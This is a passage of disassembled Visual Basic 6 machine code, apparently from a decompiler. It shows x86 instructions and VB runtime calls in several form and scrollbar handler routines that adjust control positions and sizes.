0087B155: jmp 87B15Eh
0087B157: and var_0000021C, 00000000h
0087B15E: fld real4 ptr var_00000124
0087B164: fadd real4 ptr var_00000128
0087B16A: fstsw ax
0087B16C: test al, 0Dh
0087B16E: jnz 0087B9B0h
0087B174: push ecx
0087B175: fstp real4 ptr [esp]
0087B178: mov eax, var_00000144
0087B17E: mov eax, [eax]
0087B180: push var_00000144
0087B186: call [eax+5Ch]
0087B189: fclex 
0087B18B: mov var_00000148, eax
0087B191: cmp var_00000148, 00000000h
0087B198: jnl 87B1BAh
0087B19A: push 0000005Ch
0087B19C: push 00457C34h
0087B1A1: push var_00000144
0087B1A7: push var_00000148
0087B1AD: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087B1B2: mov var_00000220, eax
0087B1B8: jmp 87B1C1h
0087B1BA: and var_00000220, 00000000h
0087B1C1: lea eax, var_3C
0087B1C4: push eax
0087B1C5: lea eax, var_38
0087B1C8: push eax
0087B1C9: lea eax, var_34
0087B1CC: push eax
0087B1CD: push 00000003h
0087B1CF: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087B1D4: add esp, 00000010h
0087B1D7: mov eax, [ebp+08h]
0087B1DA: mov eax, [eax]
0087B1DC: push [ebp+08h]
0087B1DF: call [eax+00000330h]
0087B1E5: push eax
0087B1E6: lea eax, var_38
0087B1E9: push eax
0087B1EA: call 00410A84h ; Set (object)
0087B1EF: mov var_0000013C, eax
0087B1F5: mov eax, [ebp+08h]
0087B1F8: mov eax, [eax]
0087B1FA: push [ebp+08h]
0087B1FD: call [eax+00000328h]
0087B203: push eax
0087B204: lea eax, var_34
0087B207: push eax
0087B208: call 00410A84h ; Set (object)
0087B20D: mov var_00000134, eax
0087B213: lea eax, var_00000124
0087B219: push eax
0087B21A: mov eax, var_00000134
0087B220: mov eax, [eax]
0087B222: push var_00000134
0087B228: call [eax+00000088h]
0087B22E: fclex 
0087B230: mov var_00000138, eax
0087B236: cmp var_00000138, 00000000h
0087B23D: jnl 87B262h
0087B23F: push 00000088h
0087B244: push 00440EDCh
0087B249: push var_00000134
0087B24F: push var_00000138
0087B255: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087B25A: mov var_00000224, eax
0087B260: jmp 87B269h
0087B262: and var_00000224, 00000000h
0087B269: fld real4 ptr var_00000124
0087B26F: push ecx
0087B270: fstp real4 ptr [esp]
0087B273: mov eax, var_0000013C
0087B279: mov eax, [eax]
0087B27B: push var_0000013C
0087B281: call [eax+74h]
0087B284: fclex 
0087B286: mov var_00000140, eax
0087B28C: cmp var_00000140, 00000000h
0087B293: jnl 87B2B5h
0087B295: push 00000074h
0087B297: push 00457C34h
0087B29C: push var_0000013C
0087B2A2: push var_00000140
0087B2A8: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087B2AD: mov var_00000228, eax
0087B2B3: jmp 87B2BCh
0087B2B5: and var_00000228, 00000000h
0087B2BC: lea eax, var_38
0087B2BF: push eax
0087B2C0: lea eax, var_34
0087B2C3: push eax
0087B2C4: push 00000002h
0087B2C6: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087B2CB: add esp, 0000000Ch
0087B2CE: mov eax, [ebp+08h]
0087B2D1: mov eax, [eax]
0087B2D3: push [ebp+08h]
0087B2D6: call [eax+00000328h]
0087B2DC: push eax
0087B2DD: lea eax, var_38
0087B2E0: push eax
0087B2E1: call 00410A84h ; Set (object)
0087B2E6: mov var_00000134, eax
0087B2EC: lea eax, var_00000128
0087B2F2: push eax
0087B2F3: mov eax, var_00000134
0087B2F9: mov eax, [eax]
0087B2FB: push var_00000134
0087B301: call [eax+00000088h]
0087B307: fclex 
0087B309: mov var_00000138, eax
0087B30F: cmp var_00000138, 00000000h
0087B316: jnl 87B33Bh
0087B318: push 00000088h
0087B31D: push 00440EDCh
0087B322: push var_00000134
0087B328: push var_00000138
0087B32E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087B333: mov var_0000022C, eax
0087B339: jmp 87B342h
0087B33B: and var_0000022C, 00000000h
0087B342: mov eax, [ebp+08h]
0087B345: mov eax, [eax]
0087B347: push [ebp+08h]
0087B34A: call [eax+0000032Ch]
0087B350: push eax
0087B351: lea eax, var_3C
0087B354: push eax
0087B355: call 00410A84h ; Set (object)
0087B35A: mov var_00000144, eax
0087B360: mov eax, [ebp+08h]
0087B363: mov eax, [eax]
0087B365: push [ebp+08h]
0087B368: call [eax+00000328h]
0087B36E: push eax
0087B36F: lea eax, var_34
0087B372: push eax
0087B373: call 00410A84h ; Set (object)
0087B378: mov var_0000013C, eax
0087B37E: lea eax, var_00000124
0087B384: push eax
0087B385: mov eax, var_0000013C
0087B38B: mov eax, [eax]
0087B38D: push var_0000013C
0087B393: call [eax+78h]
0087B396: fclex 
0087B398: mov var_00000140, eax
0087B39E: cmp var_00000140, 00000000h
0087B3A5: jnl 87B3C7h
0087B3A7: push 00000078h
0087B3A9: push 00440EDCh
0087B3AE: push var_0000013C
0087B3B4: push var_00000140
0087B3BA: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087B3BF: mov var_00000230, eax
0087B3C5: jmp 87B3CEh
0087B3C7: and var_00000230, 00000000h
0087B3CE: fld real4 ptr var_00000124
0087B3D4: fadd real4 ptr var_00000128
0087B3DA: fstsw ax
0087B3DC: test al, 0Dh
0087B3DE: jnz 0087B9B0h
0087B3E4: push ecx
0087B3E5: fstp real4 ptr [esp]
0087B3E8: mov eax, var_00000144
0087B3EE: mov eax, [eax]
0087B3F0: push var_00000144
0087B3F6: call [eax+64h]
0087B3F9: fclex 
0087B3FB: mov var_00000148, eax
0087B401: cmp var_00000148, 00000000h
0087B408: jnl 87B42Ah
0087B40A: push 00000064h
0087B40C: push 00457C24h
0087B411: push var_00000144
0087B417: push var_00000148
0087B41D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087B422: mov var_00000234, eax
0087B428: jmp 87B431h
0087B42A: and var_00000234, 00000000h
0087B431: lea eax, var_3C
0087B434: push eax
0087B435: lea eax, var_38
0087B438: push eax
0087B439: lea eax, var_34
0087B43C: push eax
0087B43D: push 00000003h
0087B43F: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087B444: add esp, 00000010h
0087B447: mov eax, [ebp+08h]
0087B44A: mov eax, [eax]
0087B44C: push [ebp+08h]
0087B44F: call [eax+0000032Ch]
0087B455: push eax
0087B456: lea eax, var_38
0087B459: push eax
0087B45A: call 00410A84h ; Set (object)
0087B45F: mov var_0000013C, eax
0087B465: mov eax, [ebp+08h]
0087B468: mov eax, [eax]
0087B46A: push [ebp+08h]
0087B46D: call [eax+00000328h]
0087B473: push eax
0087B474: lea eax, var_34
0087B477: push eax
0087B478: call 00410A84h ; Set (object)
0087B47D: mov var_00000134, eax
0087B483: lea eax, var_00000124
0087B489: push eax
0087B48A: mov eax, var_00000134
0087B490: mov eax, [eax]
0087B492: push var_00000134
0087B498: call [eax+00000080h]
0087B49E: fclex 
0087B4A0: mov var_00000138, eax
0087B4A6: cmp var_00000138, 00000000h
0087B4AD: jnl 87B4D2h
0087B4AF: push 00000080h
0087B4B4: push 00440EDCh
0087B4B9: push var_00000134
0087B4BF: push var_00000138
0087B4C5: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087B4CA: mov var_00000238, eax
0087B4D0: jmp 87B4D9h
0087B4D2: and var_00000238, 00000000h
0087B4D9: fld real4 ptr var_00000124
0087B4DF: push ecx
0087B4E0: fstp real4 ptr [esp]
0087B4E3: mov eax, var_0000013C
0087B4E9: mov eax, [eax]
0087B4EB: push var_0000013C
0087B4F1: call [eax+6Ch]
0087B4F4: fclex 
0087B4F6: mov var_00000140, eax
0087B4FC: cmp var_00000140, 00000000h
0087B503: jnl 87B525h
0087B505: push 0000006Ch
0087B507: push 00457C24h
0087B50C: push var_0000013C
0087B512: push var_00000140
0087B518: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087B51D: mov var_0000023C, eax
0087B523: jmp 87B52Ch
0087B525: and var_0000023C, 00000000h
0087B52C: lea eax, var_38
0087B52F: push eax
0087B530: lea eax, var_34
0087B533: push eax
0087B534: push 00000002h
0087B536: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087B53B: add esp, 0000000Ch
0087B53E: mov eax, [ebp+08h]
0087B541: mov eax, [eax]
0087B543: push [ebp+08h]
0087B546: call [eax+0000032Ch]
0087B54C: push eax
0087B54D: lea eax, var_38
0087B550: push eax
0087B551: call 00410A84h ; Set (object)
0087B556: mov var_00000134, eax
0087B55C: lea eax, var_00000128
0087B562: push eax
0087B563: mov eax, var_00000134
0087B569: mov eax, [eax]
0087B56B: push var_00000134
0087B571: call [eax+70h]
0087B574: fclex 
0087B576: mov var_00000138, eax
0087B57C: cmp var_00000138, 00000000h
0087B583: jnl 87B5A5h
0087B585: push 00000070h
0087B587: push 00457C24h
0087B58C: push var_00000134
0087B592: push var_00000138
0087B598: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087B59D: mov var_00000240, eax
0087B5A3: jmp 87B5ACh
0087B5A5: and var_00000240, 00000000h
0087B5AC: mov eax, [ebp+08h]
0087B5AF: mov eax, [eax]
0087B5B1: push [ebp+08h]
0087B5B4: call [eax+00000334h]
0087B5BA: push eax
0087B5BB: lea eax, var_3C
0087B5BE: push eax
0087B5BF: call 00410A84h ; Set (object)
0087B5C4: mov var_00000144, eax
0087B5CA: mov eax, [ebp+08h]
0087B5CD: mov eax, [eax]
0087B5CF: push [ebp+08h]
0087B5D2: call [eax+0000032Ch]
0087B5D8: push eax
0087B5D9: lea eax, var_34
0087B5DC: push eax
0087B5DD: call 00410A84h ; Set (object)
0087B5E2: mov var_0000013C, eax
0087B5E8: lea eax, var_00000124
0087B5EE: push eax
0087B5EF: mov eax, var_0000013C
0087B5F5: mov eax, [eax]
0087B5F7: push var_0000013C
0087B5FD: call [eax+60h]
0087B600: fclex 
0087B602: mov var_00000140, eax
0087B608: cmp var_00000140, 00000000h
0087B60F: jnl 87B631h
0087B611: push 00000060h
0087B613: push 00457C24h
0087B618: push var_0000013C
0087B61E: push var_00000140
0087B624: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087B629: mov var_00000244, eax
0087B62F: jmp 87B638h
0087B631: and var_00000244, 00000000h
0087B638: fld real4 ptr var_00000124
0087B63E: fadd real4 ptr var_00000128
0087B644: fadd real4 ptr [0040C1C8h]
0087B64A: fstsw ax
0087B64C: test al, 0Dh
0087B64E: jnz 0087B9B0h
0087B654: push ecx
0087B655: fstp real4 ptr [esp]
0087B658: mov eax, var_00000144
0087B65E: mov eax, [eax]
0087B660: push var_00000144
0087B666: call [eax+64h]
0087B669: fclex 
0087B66B: mov var_00000148, eax
0087B671: cmp var_00000148, 00000000h
0087B678: jnl 87B69Ah
0087B67A: push 00000064h
0087B67C: push 00457C24h
0087B681: push var_00000144
0087B687: push var_00000148
0087B68D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087B692: mov var_00000248, eax
0087B698: jmp 87B6A1h
0087B69A: and var_00000248, 00000000h
0087B6A1: lea eax, var_3C
0087B6A4: push eax
0087B6A5: lea eax, var_38
0087B6A8: push eax
0087B6A9: lea eax, var_34
0087B6AC: push eax
0087B6AD: push 00000003h
0087B6AF: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087B6B4: add esp, 00000010h
0087B6B7: mov eax, [ebp+08h]
0087B6BA: mov eax, [eax]
0087B6BC: push [ebp+08h]
0087B6BF: call [eax+00000334h]
0087B6C5: push eax
0087B6C6: lea eax, var_38
0087B6C9: push eax
0087B6CA: call 00410A84h ; Set (object)
0087B6CF: mov var_0000013C, eax
0087B6D5: mov eax, [ebp+08h]
0087B6D8: mov eax, [eax]
0087B6DA: push [ebp+08h]
0087B6DD: call [eax+00000328h]
0087B6E3: push eax
0087B6E4: lea eax, var_34
0087B6E7: push eax
0087B6E8: call 00410A84h ; Set (object)
0087B6ED: mov var_00000134, eax
0087B6F3: lea eax, var_00000124
0087B6F9: push eax
0087B6FA: mov eax, var_00000134
0087B700: mov eax, [eax]
0087B702: push var_00000134
0087B708: call [eax+00000080h]
0087B70E: fclex 
0087B710: mov var_00000138, eax
0087B716: cmp var_00000138, 00000000h
0087B71D: jnl 87B742h
0087B71F: push 00000080h
0087B724: push 00440EDCh
0087B729: push var_00000134
0087B72F: push var_00000138
0087B735: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087B73A: mov var_0000024C, eax
0087B740: jmp 87B749h
0087B742: and var_0000024C, 00000000h
0087B749: fld real4 ptr var_00000124
0087B74F: push ecx
0087B750: fstp real4 ptr [esp]
0087B753: mov eax, var_0000013C
0087B759: mov eax, [eax]
0087B75B: push var_0000013C
0087B761: call [eax+6Ch]
0087B764: fclex 
0087B766: mov var_00000140, eax
0087B76C: cmp var_00000140, 00000000h
0087B773: jnl 87B795h
0087B775: push 0000006Ch
0087B777: push 00457C24h
0087B77C: push var_0000013C
0087B782: push var_00000140
0087B788: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087B78D: mov var_00000250, eax
0087B793: jmp 87B79Ch
0087B795: and var_00000250, 00000000h
0087B79C: lea eax, var_38
0087B79F: push eax
0087B7A0: lea eax, var_34
0087B7A3: push eax
0087B7A4: push 00000002h
0087B7A6: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087B7AB: add esp, 0000000Ch
0087B7AE: mov eax, [ebp+08h]
0087B7B1: and word ptr [eax+48h], 0000h
0087B7B6: mov eax, [ebp+08h]
0087B7B9: mov eax, [eax]
0087B7BB: push [ebp+08h]
0087B7BE: call [eax+0000072Ch]
0087B7C4: mov var_00000134, eax
0087B7CA: cmp var_00000134, 00000000h
0087B7D1: jnl 87B7F3h
0087B7D3: push 0000072Ch
0087B7D8: push 00441844h
0087B7DD: push [ebp+08h]
0087B7E0: push var_00000134
0087B7E6: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087B7EB: mov var_00000254, eax
0087B7F1: jmp 87B7FAh
0087B7F3: and var_00000254, 00000000h
0087B7FA: mov eax, [ebp+08h]
0087B7FD: mov eax, [eax]
0087B7FF: push [ebp+08h]
0087B802: call [eax+00000734h]
0087B808: mov var_00000134, eax
0087B80E: cmp var_00000134, 00000000h
0087B815: jnl 87B837h
0087B817: push 00000734h
0087B81C: push 00441844h
0087B821: push [ebp+08h]
0087B824: push var_00000134
0087B82A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087B82F: mov var_00000258, eax
0087B835: jmp 87B83Eh
0087B837: and var_00000258, 00000000h
0087B83E: mov eax, [ebp+08h]
0087B841: mov eax, [eax]
0087B843: push [ebp+08h]
0087B846: call [eax+00000334h]
0087B84C: push eax
0087B84D: lea eax, var_34
0087B850: push eax
0087B851: call 00410A84h ; Set (object)
0087B856: mov var_00000134, eax
0087B85C: push 00000019h
0087B85E: mov eax, var_00000134
0087B864: mov eax, [eax]
0087B866: push var_00000134
0087B86C: call [eax+000000BCh]
0087B872: fclex 
0087B874: mov var_00000138, eax
0087B87A: cmp var_00000138, 00000000h
0087B881: jnl 87B8A6h
0087B883: push 000000BCh
0087B888: push 00457C24h
0087B88D: push var_00000134
0087B893: push var_00000138
0087B899: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087B89E: mov var_0000025C, eax
0087B8A4: jmp 87B8ADh
0087B8A6: and var_0000025C, 00000000h
0087B8AD: lea ecx, var_34
0087B8B0: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087B8B5: mov eax, [ebp+08h]
0087B8B8: mov eax, [eax]
0087B8BA: push [ebp+08h]
0087B8BD: call [eax+00000730h]
0087B8C3: mov var_00000134, eax
0087B8C9: cmp var_00000134, 00000000h
0087B8D0: jnl 87B8F2h
0087B8D2: push 00000730h
0087B8D7: push 00441844h
0087B8DC: push [ebp+08h]
0087B8DF: push var_00000134
0087B8E5: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087B8EA: mov var_00000260, eax
0087B8F0: jmp 87B8F9h
0087B8F2: and var_00000260, 00000000h
0087B8F9: call 004109C4h ; msvbvm60.dll.__vbaExitProc
0087B8FE: wait 
0087B8FF: push 0087B991h
0087B904: jmp 87B95Eh
0087B906: lea eax, var_30
0087B909: push eax
0087B90A: lea eax, var_2C
0087B90D: push eax
0087B90E: push 00000002h
0087B910: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0087B915: add esp, 0000000Ch
0087B918: lea eax, var_3C
0087B91B: push eax
0087B91C: lea eax, var_38
0087B91F: push eax
0087B920: lea eax, var_34
0087B923: push eax
0087B924: push 00000003h
0087B926: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087B92B: add esp, 00000010h
0087B92E: lea eax, var_000000AC
0087B934: push eax
0087B935: lea eax, var_0000009C
0087B93B: push eax
0087B93C: lea eax, var_0000008C
0087B942: push eax
0087B943: lea eax, var_7C
0087B946: push eax
0087B947: lea eax, var_6C
0087B94A: push eax
0087B94B: lea eax, var_5C
0087B94E: push eax
0087B94F: lea eax, var_4C
0087B952: push eax
0087B953: push 00000007h
0087B955: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0087B95A: add esp, 00000020h
0087B95D: ret 
End Sub

Private sub Form__87B9B5
0087B9B5: push ebp
0087B9B6: mov ebp, esp
0087B9B8: sub esp, 00000018h
0087B9BB: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0087B9C0: mov eax, fs:[00h]
0087B9C6: push eax
0087B9C7: mov fs:[00000000h], esp
0087B9CE: mov eax, 00000080h
0087B9D3: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087B9D8: push ebx
0087B9D9: push esi
0087B9DA: push edi
0087B9DB: mov var_18, esp
0087B9DE: mov var_14, 0040D7A8h
0087B9E5: mov eax, [ebp+08h]
0087B9E8: and eax, 00000001h
0087B9EB: mov var_10, eax
0087B9EE: mov eax, [ebp+08h]
0087B9F1: and al, FEh
0087B9F3: mov [ebp+08h], eax
0087B9F6: mov var_0C, 00000000h
0087B9FD: mov eax, [ebp+08h]
0087BA00: mov eax, [eax]
0087BA02: push [ebp+08h]
0087BA05: call [eax+04h]
0087BA08: mov var_04, 00000001h
0087BA0F: mov var_04, 00000002h
0087BA16: push FFFFFFFFh
0087BA18: call 00410A60h ; On Error ...
0087BA1D: mov var_04, 00000003h
0087BA24: lea eax, var_60
0087BA27: push eax
0087BA28: mov eax, [ebp+08h]
0087BA2B: mov eax, [eax]
0087BA2D: push [ebp+08h]
0087BA30: call [eax+00000080h]
0087BA36: fclex 
0087BA38: mov var_68, eax
0087BA3B: cmp var_68, 00000000h
0087BA3F: jnl 87BA5Eh
0087BA41: push 00000080h
0087BA46: push 00441814h
0087BA4B: push [ebp+08h]
0087BA4E: push var_68
0087BA51: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087BA56: mov var_0000008C, eax
0087BA5C: jmp 87BA65h
0087BA5E: and var_0000008C, 00000000h
0087BA65: mov eax, [ebp+08h]
0087BA68: mov eax, [eax]
0087BA6A: push [ebp+08h]
0087BA6D: call [eax+000002FCh]
0087BA73: push eax
0087BA74: lea eax, var_24
0087BA77: push eax
0087BA78: call 00410A84h ; Set (object)
0087BA7D: mov var_70, eax
0087BA80: lea eax, var_64
0087BA83: push eax
0087BA84: mov eax, [ebp+08h]
0087BA87: mov eax, [eax]
0087BA89: push [ebp+08h]
0087BA8C: call [eax+00000088h]
0087BA92: fclex 
0087BA94: mov var_6C, eax
0087BA97: cmp var_6C, 00000000h
0087BA9B: jnl 87BABAh
0087BA9D: push 00000088h
0087BAA2: push 00441814h
0087BAA7: push [ebp+08h]
0087BAAA: push var_6C
0087BAAD: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087BAB2: mov var_00000090, eax
0087BAB8: jmp 87BAC1h
0087BABA: and var_00000090, 00000000h
0087BAC1: fld real4 ptr var_64
0087BAC4: fstp real4 ptr var_50
0087BAC7: mov var_58, 00000004h
0087BACE: fld real4 ptr var_60
0087BAD1: fstp real4 ptr var_40
0087BAD4: mov var_48, 00000004h
0087BADB: and var_30, 00000000h
0087BADF: mov var_38, 00000002h
0087BAE6: push 00000010h
0087BAE8: pop eax
0087BAE9: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087BAEE: lea esi, var_58
0087BAF1: mov edi, esp
0087BAF3: movsd 
0087BAF4: movsd 
0087BAF5: movsd 
0087BAF6: movsd 
0087BAF7: push 00000010h
0087BAF9: pop eax
0087BAFA: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087BAFF: lea esi, var_48
0087BB02: mov edi, esp
0087BB04: movsd 
0087BB05: movsd 
0087BB06: movsd 
0087BB07: movsd 
0087BB08: push 00000010h
0087BB0A: pop eax
0087BB0B: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087BB10: lea esi, var_38
0087BB13: mov edi, esp
0087BB15: movsd 
0087BB16: movsd 
0087BB17: movsd 
0087BB18: movsd 
0087BB19: fldz 
0087BB1B: push ecx
0087BB1C: fstp real4 ptr [esp]
0087BB1F: mov eax, var_70
0087BB22: mov eax, [eax]
0087BB24: push var_70
0087BB27: call [eax+00000268h]
0087BB2D: fclex 
0087BB2F: mov var_74, eax
0087BB32: cmp var_74, 00000000h
0087BB36: jnl 87BB55h
0087BB38: push 00000268h
0087BB3D: push 00440EDCh
0087BB42: push var_70
0087BB45: push var_74
0087BB48: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087BB4D: mov var_00000094, eax
0087BB53: jmp 87BB5Ch
0087BB55: and var_00000094, 00000000h
0087BB5C: lea ecx, var_24
0087BB5F: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087BB64: mov var_04, 00000004h
0087BB6B: mov eax, [ebp+08h]
0087BB6E: mov eax, [eax]
0087BB70: push [ebp+08h]
0087BB73: call [eax+00000334h]
0087BB79: push eax
0087BB7A: lea eax, var_28
0087BB7D: push eax
0087BB7E: call 00410A84h ; Set (object)
0087BB83: mov var_70, eax
0087BB86: mov eax, [ebp+08h]
0087BB89: mov eax, [eax]
0087BB8B: push [ebp+08h]
0087BB8E: call [eax+00000334h]
0087BB94: push eax
0087BB95: lea eax, var_24
0087BB98: push eax
0087BB99: call 00410A84h ; Set (object)
0087BB9E: mov var_68, eax
0087BBA1: lea eax, var_5C
0087BBA4: push eax
0087BBA5: mov eax, var_68
0087BBA8: mov eax, [eax]
0087BBAA: push var_68
0087BBAD: call [eax+000000B8h]
0087BBB3: fclex 
0087BBB5: mov var_6C, eax
0087BBB8: cmp var_6C, 00000000h
0087BBBC: jnl 87BBDBh
0087BBBE: push 000000B8h
0087BBC3: push 00457C24h
0087BBC8: push var_68
0087BBCB: push var_6C
0087BBCE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087BBD3: mov var_00000098, eax
0087BBD9: jmp 87BBE2h
0087BBDB: and var_00000098, 00000000h
0087BBE2: mov ax, var_5C
0087BBE6: add ax, 000Ah
0087BBEA: jo 0087BCC4h
0087BBF0: push eax
0087BBF1: mov eax, var_70
0087BBF4: mov eax, [eax]
0087BBF6: push var_70
0087BBF9: call [eax+000000BCh]
0087BBFF: fclex 
0087BC01: mov var_74, eax
0087BC04: cmp var_74, 00000000h
0087BC08: jnl 87BC27h
0087BC0A: push 000000BCh
0087BC0F: push 00457C24h
0087BC14: push var_70
0087BC17: push var_74
0087BC1A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087BC1F: mov var_0000009C, eax
0087BC25: jmp 87BC2Eh
0087BC27: and var_0000009C, 00000000h
0087BC2E: lea eax, var_28
0087BC31: push eax
0087BC32: lea eax, var_24
0087BC35: push eax
0087BC36: push 00000002h
0087BC38: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087BC3D: add esp, 0000000Ch
0087BC40: mov var_04, 00000005h
0087BC47: mov eax, [ebp+08h]
0087BC4A: mov eax, [eax]
0087BC4C: push [ebp+08h]
0087BC4F: call [eax+00000730h]
0087BC55: mov var_68, eax
0087BC58: cmp var_68, 00000000h
0087BC5C: jnl 87BC7Bh
0087BC5E: push 00000730h
0087BC63: push 00441844h
0087BC68: push [ebp+08h]
0087BC6B: push var_68
0087BC6E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087BC73: mov var_000000A0, eax
0087BC79: jmp 87BC82h
0087BC7B: and var_000000A0, 00000000h
0087BC82: mov var_10, 00000000h
0087BC89: wait 
0087BC8A: push 0087BCA5h
0087BC8F: jmp 87BCA4h
0087BC91: lea eax, var_28
0087BC94: push eax
0087BC95: lea eax, var_24
0087BC98: push eax
0087BC99: push 00000002h
0087BC9B: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087BCA0: add esp, 0000000Ch
0087BCA3: ret 
End Sub

Private sub Form__87BCC9
0087BCC9: push ebp
0087BCCA: mov ebp, esp
0087BCCC: sub esp, 0000000Ch
0087BCCF: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0087BCD4: mov eax, fs:[00h]
0087BCDA: push eax
0087BCDB: mov fs:[00000000h], esp
0087BCE2: push 00000010h
0087BCE4: pop eax
0087BCE5: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087BCEA: push ebx
0087BCEB: push esi
0087BCEC: push edi
0087BCED: mov var_0C, esp
0087BCF0: mov var_08, 0040D7E0h
0087BCF7: mov eax, [ebp+08h]
0087BCFA: and eax, 00000001h
0087BCFD: mov var_04, eax
0087BD00: mov eax, [ebp+08h]
0087BD03: and al, FEh
0087BD05: mov [ebp+08h], eax
0087BD08: mov eax, [ebp+08h]
0087BD0B: mov eax, [eax]
0087BD0D: push [ebp+08h]
0087BD10: call [eax+04h]
0087BD13: push 00000000h
0087BD15: mov eax, [ebp+08h]
0087BD18: mov eax, [eax]
0087BD1A: push [ebp+08h]
0087BD1D: call [eax+000001BCh]
0087BD23: fclex 
0087BD25: mov var_18, eax
0087BD28: cmp var_18, 00000000h
0087BD2C: jnl 87BD48h
0087BD2E: push 000001BCh
0087BD33: push 00441814h
0087BD38: push [ebp+08h]
0087BD3B: push var_18
0087BD3E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087BD43: mov var_24, eax
0087BD46: jmp 87BD4Ch
0087BD48: and var_24, 00000000h
0087BD4C: mov eax, [ebp+0Ch]
0087BD4F: or word ptr [eax], FFFFh
0087BD53: mov var_04, 00000000h
0087BD5A: mov eax, [ebp+08h]
0087BD5D: mov eax, [eax]
0087BD5F: push [ebp+08h]
0087BD62: call [eax+08h]
0087BD65: mov eax, var_04
0087BD68: mov ecx, var_14
0087BD6B: mov fs:[00000000h], ecx
0087BD72: pop edi
0087BD73: pop esi
0087BD74: pop ebx
0087BD75: leave 
0087BD76: retn 0008h
End Sub

Private sub scrHoristontal__8802AA
008802AA: push ebp
008802AB: mov ebp, esp
008802AD: sub esp, 0000000Ch
008802B0: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008802B5: mov eax, fs:[00h]
008802BB: push eax
008802BC: mov fs:[00000000h], esp
008802C3: push 00000034h
008802C5: pop eax
008802C6: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008802CB: push ebx
008802CC: push esi
008802CD: push edi
008802CE: mov var_0C, esp
008802D1: mov var_08, 0040D9D0h
008802D8: mov eax, [ebp+08h]
008802DB: and eax, 00000001h
008802DE: mov var_04, eax
008802E1: mov eax, [ebp+08h]
008802E4: and al, FEh
008802E6: mov [ebp+08h], eax
008802E9: mov eax, [ebp+08h]
008802EC: mov eax, [eax]
008802EE: push [ebp+08h]
008802F1: call [eax+04h]
008802F4: mov eax, [ebp+08h]
008802F7: mov eax, [eax]
008802F9: push [ebp+08h]
008802FC: call [eax+000002FCh]
00880302: push eax
00880303: lea eax, var_1C
00880306: push eax
00880307: call 00410A84h ; Set (object)
0088030C: mov var_2C, eax
0088030F: mov eax, [ebp+08h]
00880312: mov eax, [eax]
00880314: push [ebp+08h]
00880317: call [eax+00000330h]
0088031D: push eax
0088031E: lea eax, var_18
00880321: push eax
00880322: call 00410A84h ; Set (object)
00880327: mov var_24, eax
0088032A: lea eax, var_20
0088032D: push eax
0088032E: mov eax, var_24
00880331: mov eax, [eax]
00880333: push var_24
00880336: call [eax+000000B8h]
0088033C: fclex 
0088033E: mov var_28, eax
00880341: cmp var_28, 00000000h
00880345: jnl 880361h
00880347: push 000000B8h
0088034C: push 00457C34h
00880351: push var_24
00880354: push var_28
00880357: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0088035C: mov var_3C, eax
0088035F: jmp 880365h
00880361: and var_3C, 00000000h
00880365: mov ax, var_20
00880369: neg ax
0088036C: movsx eax, ax
0088036F: mov var_40, eax
00880372: fild dword ptr var_40
00880375: fstp real4 ptr var_44
00880378: fld real4 ptr var_44
0088037B: push ecx
0088037C: fstp real4 ptr [esp]
0088037F: mov eax, var_2C
00880382: mov eax, [eax]
00880384: push var_2C
00880387: call [eax+7Ch]
0088038A: fclex 
0088038C: mov var_30, eax
0088038F: cmp var_30, 00000000h
00880393: jnl 8803ACh
00880395: push 0000007Ch
00880397: push 00440EDCh
0088039C: push var_2C
0088039F: push var_30
008803A2: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008803A7: mov var_48, eax
008803AA: jmp 8803B0h
008803AC: and var_48, 00000000h
008803B0: lea eax, var_1C
008803B3: push eax
008803B4: lea eax, var_18
008803B7: push eax
008803B8: push 00000002h
008803BA: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008803BF: add esp, 0000000Ch
